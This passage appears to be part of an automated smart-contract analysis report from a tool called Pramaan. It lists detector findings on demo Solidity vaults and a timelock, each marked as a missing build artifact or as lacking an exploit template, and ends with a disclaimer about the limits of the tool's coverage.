- PRM-19 src/demo/DemoNFT.sol.- (push-zero-opcode): contract src/demo/DemoNFT.sol not found in build output
- PRM-20 src/demo/DemoToken.sol.- (push-zero-opcode): contract src/demo/DemoToken.sol not found in build output
- PRM-21 src/demo/MirrorYieldFarm.sol.- (push-zero-opcode): contract src/demo/MirrorYieldFarm.sol not found in build output
- PRM-22 src/demo/PermitMarketplace.sol.- (push-zero-opcode): contract src/demo/PermitMarketplace.sol not found in build output
- PRM-23 src/demo/VaultV2.sol.- (push-zero-opcode): contract src/demo/VaultV2.sol not found in build output
- PRM-24 src/demo/VaultV3Unaudited.sol.- (push-zero-opcode): contract src/demo/VaultV3Unaudited.sol not found in build output
- PRM-25 src/demo/VulnerableVault.sol.- (push-zero-opcode): contract src/demo/VulnerableVault.sol not found in build output
- PRM-26 src/interfaces/ITextSetter.sol.- (push-zero-opcode): contract src/interfaces/ITextSetter.sol not found in build output
- PRM-27 src/PramaanTimelock.sol.- (push-zero-opcode): contract src/PramaanTimelock.sol not found in build output
- PRM-28 PramaanTimelock.execute(uint256) (reentrancy-events): no exploit template for class "reentrancy-events"
- PRM-29 VaultV2.withdraw(uint256) (reentrancy-events): no exploit template for class "reentrancy-events"
- PRM-30 VaultV2.withdrawAll() (reentrancy-events): no exploit template for class "reentrancy-events"
- PRM-31 VulnerableVault.withdraw(uint256) (reentrancy-events): no exploit template for class "reentrancy-events"
- PRM-32 VulnerableVault.withdrawAll() (reentrancy-events): no exploit template for class "reentrancy-events"
- PRM-33 PramaanTimelock._validate(string) (require-revert-in-loop): no exploit template for class "require-revert-in-loop"
- PRM-34 VaultV2.initialize(address,addressIERC20) (state-no-address-check): no exploit template for class "state-no-address-check"
- PRM-35 VulnerableVault.initialize(address,addressIERC20) (state-no-address-check): no exploit template for class "state-no-address-check"
- PRM-36 src/PramaanTimelock.sol.- (state-variable-could-be-immutable): contract src/PramaanTimelock.sol not found in build output
- PRM-37 DemoToken.faucet() (timestamp): no exploit template for class "timestamp"
- PRM-38 MirrorYieldFarm._claim() (timestamp): no exploit template for class "timestamp"
- PRM-39 MirrorYieldFarm.fundRewards(uint256,uint256) (timestamp): no exploit template for class "timestamp"
- PRM-40 MirrorYieldFarm.lastTimeRewardApplicable() (timestamp): no exploit template for class "timestamp"
- PRM-41 MirrorYieldFarm.rewardsRemaining() (timestamp): no exploit template for class "timestamp"
- PRM-42 PramaanTimelock.execute(uint256) (timestamp): no exploit template for class "timestamp"
- PRM-43 PramaanTimelock.isReady(uint256) (timestamp): no exploit template for class "timestamp"
- PRM-44 src/demo/DemoNFT.sol.- (unspecific-solidity-pragma): contract src/demo/DemoNFT.sol not found in build output
- PRM-45 src/demo/DemoToken.sol.- (unspecific-solidity-pragma): contract src/demo/DemoToken.sol not found in build output
- PRM-46 src/demo/MirrorYieldFarm.sol.- (unspecific-solidity-pragma): contract src/demo/MirrorYieldFarm.sol not found in build output
- PRM-47 src/demo/PermitMarketplace.sol.- (unspecific-solidity-pragma): contract src/demo/PermitMarketplace.sol not found in build output
- PRM-48 src/demo/VaultV2.sol.- (unspecific-solidity-pragma): contract src/demo/VaultV2.sol not found in build output
- PRM-49 src/demo/VaultV3Unaudited.sol.- (unspecific-solidity-pragma): contract src/demo/VaultV3Unaudited.sol not found in build output
- PRM-50 src/demo/VulnerableVault.sol.- (unspecific-solidity-pragma): contract src/demo/VulnerableVault.sol not found in build output
- PRM-51 src/interfaces/ITextSetter.sol.- (unspecific-solidity-pragma): contract src/interfaces/ITextSetter.sol not found in build output
- PRM-52 src/PramaanTimelock.sol.- (unspecific-solidity-pragma): contract src/PramaanTimelock.sol not found in build output

---
Pramaan reports what was proven or disproven for the bug classes it has templates for. It does not claim the code is free of other vulnerabilities.